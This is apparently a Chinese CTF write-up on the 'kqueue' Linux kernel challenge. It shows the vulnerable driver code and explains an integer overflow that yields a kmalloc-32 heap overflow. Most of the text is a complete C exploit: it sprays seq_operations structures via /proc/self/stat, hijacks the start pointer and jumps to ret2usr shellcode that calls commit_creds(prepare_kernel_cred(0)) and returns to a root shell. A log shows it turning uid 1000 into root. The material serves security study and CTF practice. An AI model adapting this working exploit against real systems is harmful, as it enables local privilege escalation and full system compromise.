<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> noinline <span class="keyword">long</span> <span class="title">create_kqueue</span><span class="params">(<span class="keyword">request_t</span> request)</span></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> result = INVALID;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(queueCount &gt; MAX_QUEUES)</span><br><span class="line">        err(<span class="string">&quot;[-] Max queue count reached&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* You can&#x27;t ask for 0 queues , how meaningless */</span></span><br><span class="line">    <span class="keyword">if</span>(request.max_entries&lt;<span class="number">1</span>)</span><br><span class="line">        err(<span class="string">&quot;[-] kqueue entries should be greater than 0&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Asking for too much is also not good */</span></span><br><span class="line">    <span class="keyword">if</span>(request.data_size&gt;MAX_DATA_SIZE)</span><br><span class="line">        err(<span class="string">&quot;[-] kqueue data size exceed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Initialize kqueue_entry structure */</span></span><br><span class="line">    queue_entry *kqueue_entry;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check if multiplication of 2 64 bit integers results in overflow */</span></span><br><span class="line">    ull space = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(__builtin_umulll_overflow(<span class="keyword">sizeof</span>(queue_entry),(request.max_entries+<span class="number">1</span>),&amp;space) == <span class="literal">true</span>)</span><br><span class="line">        err(<span class="string">&quot;[-] Integer overflow&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Size is the size of queue structure + size of entry * request entries */</span></span><br><span class="line">    ull queue_size = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(__builtin_saddll_overflow(<span class="keyword">sizeof</span>(<span class="built_in">queue</span>),space,&amp;queue_size) == <span class="literal">true</span>)</span><br><span class="line">        err(<span class="string">&quot;[-] Integer overflow&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Total size should not exceed a certain limit */</span></span><br><span class="line">    <span class="keyword">if</span>(queue_size&gt;<span class="keyword">sizeof</span>(<span class="built_in">queue</span>) + <span class="number">0x10000</span>)</span><br><span class="line">        err(<span class="string">&quot;[-] Max kqueue alloc limit reached&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* All checks done , now call kzalloc */</span></span><br><span class="line">    <span class="built_in">queue</span> *<span class="built_in">queue</span> = validate((<span class="keyword">char</span> *)kmalloc(queue_size,GFP_KERNEL));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Main queue can also store data */</span></span><br><span class="line">    <span class="built_in">queue</span>-&gt;data = validate((<span class="keyword">char</span> *)kmalloc(request.data_size,GFP_KERNEL));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Fill the remaining queue structure */</span></span><br><span class="line">    <span class="built_in">queue</span>-&gt;data_size   = request.data_size;</span><br><span class="line">    <span class="built_in">queue</span>-&gt;max_entries = request.max_entries;</span><br><span class="line">    <span class="built_in">queue</span>-&gt;queue_size  = queue_size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Get to the place from where memory has to be handled */</span></span><br><span class="line">    kqueue_entry = (queue_entry *)((<span class="keyword">uint64_t</span>)(<span class="built_in">queue</span> + (<span class="keyword">sizeof</span>(<span class="built_in">queue</span>)+<span class="number">1</span>)/<span class="number">8</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Allocate all kqueue entries */</span></span><br><span class="line">    queue_entry* current_entry = kqueue_entry;</span><br><span class="line">    queue_entry* prev_entry = current_entry;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span> i=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;request.max_entries+<span class="number">1</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i!=request.max_entries)</span><br><span class="line">            prev_entry-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">        current_entry-&gt;idx = i;</span><br><span class="line">        current_entry-&gt;data = (<span class="keyword">char</span> *)(validate((<span class="keyword">char</span> *)kmalloc(request.data_size,GFP_KERNEL)));</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Increment current_entry by size of queue_entry */</span></span><br><span class="line">        current_entry += <span class="keyword">sizeof</span>(queue_entry)/<span class="number">16</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Populate next pointer of the previous entry */</span></span><br><span class="line">        prev_entry-&gt;next = current_entry;</span><br><span class="line">        prev_entry = prev_entry-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Find an appropriate slot in kqueues */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;MAX_QUEUES;j++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(kqueues[j] == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(j&gt;MAX_QUEUES)</span><br><span class="line">        err(<span class="string">&quot;[-] No kqueue slot left&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Assign the newly created kqueue to the kqueues */</span></span><br><span class="line">    kqueues[j] = <span class="built_in">queue</span>;</span><br><span class="line">    queueCount++;</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> noinline <span class="keyword">long</span> <span class="title">delete_kqueue</span><span class="params">(<span class="keyword">request_t</span> request)</span></span>&#123;</span><br><span class="line">    <span class="comment">/* Check for out of bounds requests */</span></span><br><span class="line">    <span class="keyword">if</span>(request.queue_idx&gt;MAX_QUEUES)</span><br><span class="line">        err(<span class="string">&quot;[-] Invalid idx&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check for existence of the request kqueue */</span></span><br><span class="line">    <span class="built_in">queue</span> *<span class="built_in">queue</span> = kqueues[request.queue_idx];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">queue</span>)</span><br><span class="line">        err(<span class="string">&quot;[-] Requested kqueue does not exist&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    kfree(<span class="built_in">queue</span>);</span><br><span class="line">    <span class="built_in">memset</span>(<span class="built_in">queue</span>,<span class="number">0</span>,<span class="built_in">queue</span>-&gt;queue_size);</span><br><span class="line">    kqueues[request.queue_idx] = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Now you have the option to safely preserve your precious kqueues */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> noinline <span class="keyword">long</span> <span class="title">save_kqueue_entries</span><span class="params">(<span class="keyword">request_t</span> request)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check for out of bounds queue_idx requests */</span></span><br><span class="line">    <span class="keyword">if</span>(request.queue_idx &gt; MAX_QUEUES)</span><br><span class="line">        err(<span class="string">&quot;[-] Invalid kqueue idx&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check if queue is already saved or not */</span></span><br><span class="line">    <span class="keyword">if</span>(isSaved[request.queue_idx]==<span class="literal">true</span>)</span><br><span class="line">        err(<span class="string">&quot;[-] Queue already saved&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">queue</span> *<span class="built_in">queue</span> = validate(kqueues[request.queue_idx]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check if number of requested entries exceed the existing entries */</span></span><br><span class="line">    <span class="keyword">if</span>(request.max_entries &lt; <span class="number">1</span> || request.max_entries &gt; <span class="built_in">queue</span>-&gt;max_entries)</span><br><span class="line">        err(<span class="string">&quot;[-] Invalid entry count&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Allocate memory for the kqueue to be saved */</span></span><br><span class="line">    <span class="keyword">char</span> *new_queue = validate((<span class="keyword">char</span> *)kzalloc(<span class="built_in">queue</span>-&gt;queue_size,GFP_KERNEL));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Each saved entry can have its own size */</span></span><br><span class="line">    <span class="keyword">if</span>(request.data_size &gt; <span class="built_in">queue</span>-&gt;queue_size)</span><br><span class="line">        err(<span class="string">&quot;[-] Entry size limit exceed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Copy main&#x27;s queue&#x27;s data */</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">queue</span>-&gt;data &amp;&amp; request.data_size)</span><br><span class="line">        validate(<span class="built_in">memcpy</span>(new_queue,<span class="built_in">queue</span>-&gt;data,request.data_size));</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        err(<span class="string">&quot;[-] Internal error&quot;</span>);</span><br><span class="line">    new_queue += <span class="built_in">queue</span>-&gt;data_size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Get to the entries of the kqueue */</span></span><br><span class="line">    queue_entry *kqueue_entry = (queue_entry *)(<span class="built_in">queue</span> + (<span class="keyword">sizeof</span>(<span class="built_in">queue</span>)+<span class="number">1</span>)/<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* copy all possible kqueue entries */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> i=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;request.max_entries+<span class="number">1</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!kqueue_entry || !kqueue_entry-&gt;data)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span>(kqueue_entry-&gt;data &amp;&amp; request.data_size)</span><br><span class="line">            validate(<span class="built_in">memcpy</span>(new_queue,kqueue_entry-&gt;data,request.data_size));</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            err(<span class="string">&quot;[-] Internal error&quot;</span>);</span><br><span class="line">        kqueue_entry = kqueue_entry-&gt;next;</span><br><span class="line">        new_queue += <span class="built_in">queue</span>-&gt;data_size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Mark the queue as saved */</span></span><br><span class="line">    isSaved[request.queue_idx] = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在<code>creat_kqueue</code>中存在一个一个整数溢出<code>__builtin_umulll_overflow(sizeof(queue_entry),(request.max_entries+1),&amp;space)</code>,<code>request.max_entries</code>是一个uint32_t变量，所以如果传入的是0xffffffff,拿相加就会变成0，然后在<code>save_kqueue</code>中存在<code>validate(memcpy(new_queue,queue-&gt;data,request.data_size));</code>，如果在<code>create_kqueue</code>中整数溢出了，那这里的<code>new_queue</code>就是一个<code>queue</code>大小是0x20,但是memcpy的大小是我们可以控制的，所以到了这步就可以溢出0x20的堆了，溢出0x20的堆改怎么利用呢。这里就用到了第二种思路。</p>
<p>当打开一个stat文件比如(“/proc/self/stat”)的时候就会在内核分配一个<code>seq_operations</code>结构体，这个结构体的大小是0x20,记录着四个函数指针,当我们向stat使用read函数读的时候就会执行<code>seq_operations</code>结构体的start函数指针，所以我们可以利用堆喷让这个结构体置于<code>new_queue</code>堆块的下面，然后溢出覆盖第一个函数指针，最后read(seq_fd,data,0x20)就可以劫持rip了。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> &#123;</span></span><br><span class="line">    <span class="keyword">void</span> * (*start) (struct seq_file *m, <span class="keyword">loff_t</span> *pos);</span><br><span class="line">    <span class="keyword">void</span> (*stop) (struct seq_file *m, <span class="keyword">void</span> *v);</span><br><span class="line">    <span class="keyword">void</span> * (*next) (struct seq_file *m, <span class="keyword">void</span> *v, <span class="keyword">loff_t</span> *pos);</span><br><span class="line">    <span class="keyword">int</span> (*show) (struct seq_file *m, <span class="keyword">void</span> *v);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>由于没有开smep所以可以直接把rip劫持到用户态，但注意此时的栈依旧在内核上，里面有内核代码地址信息，可以通过写shellcode从栈上得到<code>commit_creds</code>和<code>prepare_kernel_cred</code>地址，然后提权后返回用户态getshell</p>
<h4 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">usr_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;getshelling&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(getuid()==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]----getshell pk&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] getshell fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">size_t</span> user_cs,user_ss,user_rflags,user_sp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">saveStatus</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> max_entries;</span><br><span class="line">    <span class="keyword">uint16_t</span> data_size;</span><br><span class="line">    <span class="keyword">uint16_t</span> entry_idx;</span><br><span class="line">    <span class="keyword">uint16_t</span> queue_idx;</span><br><span class="line">    <span class="keyword">char</span>* data;</span><br><span class="line">&#125;<span class="keyword">request_t</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">create</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">uint32_t</span> max_entries,<span class="keyword">uint16_t</span> data_size)</span></span>&#123;</span><br><span class="line">    <span class="keyword">request_t</span> request=&#123;</span><br><span class="line">        .max_entries=max_entries,</span><br><span class="line">        .data_size=data_size</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(fd,<span class="number">0xDEADC0DE</span>,&amp;request);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">edit</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">uint16_t</span> queue_idx,<span class="keyword">uint16_t</span> entry_idx,<span class="keyword">char</span>* data)</span></span>&#123;</span><br><span class="line">    <span class="keyword">request_t</span> request=&#123;</span><br><span class="line">        .data=data,</span><br><span class="line">        .entry_idx=entry_idx,</span><br><span class="line">        .queue_idx=queue_idx</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(fd,<span class="number">0xDAADEEEE</span>,&amp;request);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">uint16_t</span> queue_idx,<span class="keyword">uint32_t</span> max_entries,<span class="keyword">uint16_t</span> data_size)</span></span>&#123;</span><br><span class="line">    <span class="keyword">request_t</span> request=&#123;</span><br><span class="line">        .max_entries=max_entries,</span><br><span class="line">        .data_size=data_size,</span><br><span class="line">        .queue_idx=queue_idx</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(fd,<span class="number">0xB105BABE</span>,&amp;request);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">size_t</span> getshell=(<span class="keyword">size_t</span>)usr_shell;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shellcode</span><span class="params">()</span></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov r12, qword ptr [rsp+0x8];&quot;</span></span><br><span class="line">        <span class="string">&quot;sub r12, 0x201179;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r13, r12;&quot;</span></span><br><span class="line">        <span class="string">&quot;add r12, 0x8c140;&quot;</span></span><br><span class="line">        <span class="string">&quot;add r13, 0x8c580;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdi, 0;&quot;</span></span><br><span class="line">        <span class="string">&quot;call r13;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdi ,rax;&quot;</span></span><br><span class="line">        <span class="string">&quot;call r12;&quot;</span></span><br><span class="line">        <span class="string">&quot;swapgs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r12, user_ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;push r12;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r12, user_sp;&quot;</span></span><br><span class="line">        <span class="string">&quot;push r12;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r12, user_rflags;&quot;</span></span><br><span class="line">        <span class="string">&quot;push r12;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r12, user_cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;push r12;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r12, getshell;&quot;</span></span><br><span class="line">        <span class="string">&quot;push r12;&quot;</span></span><br><span class="line">        <span class="string">&quot;iretq;&quot;</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> seq_fd[<span class="number">0x200</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">heap_spray</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x200</span>;i++)&#123;</span><br><span class="line">        seq_fd[i]=open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);</span><br><span class="line">        <span class="keyword">if</span>(!seq_fd[i])&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;/proc/self/stat open fail&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    saveStatus();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,(<span class="keyword">size_t</span>)shellcode);</span><br><span class="line">    <span class="keyword">int</span> fd=open(<span class="string">&quot;/dev/kqueue&quot;</span>,O_RDONLY);</span><br><span class="line">    create(fd,<span class="number">0xffffffff</span>,<span class="number">0x28</span>);</span><br><span class="line">    <span class="keyword">size_t</span> data[<span class="number">5</span>]=&#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,(<span class="keyword">size_t</span>)shellcode&#125;;</span><br><span class="line">    edit(fd,<span class="number">0</span>,<span class="number">0</span>,(<span class="keyword">char</span>*)data);</span><br><span class="line">    heap_spray();</span><br><span class="line">    save(fd,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x28</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x200</span>;i++)&#123;</span><br><span class="line">        read(seq_fd[i],data,<span class="number">0x20</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">/ $ id</span><br><span class="line">uid=1000(pwn) gid=1000 groups=1000</span><br><span class="line">/ $ ./exp</span><br><span class="line">[*] Status has been saved.</span><br><span class="line">0x400b9a</span><br><span class="line">[    8.958689] [-] kqueue data size exceed</span><br><span class="line">[    8.973254] [-] Invalid entry count</span><br><span class="line">[    8.973640] [-] Entry size <span class="built_in">limit</span> exceed</span><br><span class="line">getshelling</span><br><span class="line">[*]----getshell pk</span><br><span class="line">/ <span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0</span><br></pre></td></tr></table></figure>

<h2 id="heap-spray"><a href="#heap-spray" class="headerlink" title="heap spray"></a>heap spray</h2><p>内核堆喷，依我之见主要针对的是UAF和堆溢出，利用大量的堆喷来得到UAF所指的堆或者申请到可以堆溢出的堆的下一个堆，Kqueue就是这个思路，下面的例题notebook是上一个思路。</p>
<p><strong>启动脚本</strong></p>
<p>从启动脚本中可以看见开起了kaslr,smep,smap,然后设置了两个cpu,每个cpu两个核，所以最多可以跑四个线程。然后从<code>/sys/devices/system/cpu/vulnerabilities/*</code>文件中可以看出开启了KPTI.</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">stty intr ^]</span><br><span class="line"><span class="built_in">exec</span> timeout 300 qemu-system-x86_64 -m 64M -kernel bzImage -initrd rootfs.cpio -append <span class="string">&quot;loglevel=3 console=ttyS0 oops=panic panic=1 kaslr&quot;</span> -nographic -net user -net nic -device e1000 -smp cores=2,threads=2 -cpu kvm64,+smep,+smap -monitor /dev/null 2&gt;/dev/null -s</span><br></pre></td></tr></table></figure>

